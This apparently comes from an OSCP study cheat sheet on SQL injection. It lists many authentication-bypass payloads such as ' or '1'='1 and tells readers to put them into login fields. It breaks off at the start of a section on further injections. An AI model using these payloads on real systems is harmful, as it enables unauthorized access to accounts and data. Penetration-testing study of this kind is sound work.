# SQLI

SQL Injection is a very common attack vector in the `OSCP` exam. You will most likely see atleast one box where it is the intended attack path. I would recommend to anyone that is unfamiliar with `SQL` to learn the language on a basic level first, and then understanding `SQLI` is way easier. With that being said the first thing you want to do is stuff the input fields with common `SQLI` cmds:

### Auth Bypass / SQLI Checker

```sql
';#---                   // List pulled from 0xsyr0's github.
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

###  SQL Command Injection

After stuffing the input fields you should either obtain access to the system as admin or the first user in the database. If not, you might've recieved a success message or something like that telling you that the SQL server accepted your input. In this case, try these common injections:

```sql
